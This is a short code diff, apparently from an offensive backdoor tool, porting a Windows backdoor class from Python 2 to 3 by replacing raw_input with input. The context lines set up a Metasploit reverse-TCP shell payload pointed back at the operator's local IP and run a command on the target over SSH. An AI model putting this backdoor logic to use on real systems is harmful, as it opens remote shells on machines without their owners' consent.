@@ -30,7 +30,7 @@ class Windows(Backdoor):
 	print("set payload windows/shell/reverse_tcp")
 	print("set LPORT " + str(self.get_value("port")))
 	print("set LHOST " + str(self.core.localIP))
-	raw_input("exploit")
+	input("exploit")
 	self.core.curtarget.ssh.exec_command(str(self.get_command))
 	for mod in self.modules.keys():
             print(INFO + "Attempting to execute " + mod.name + " module...")
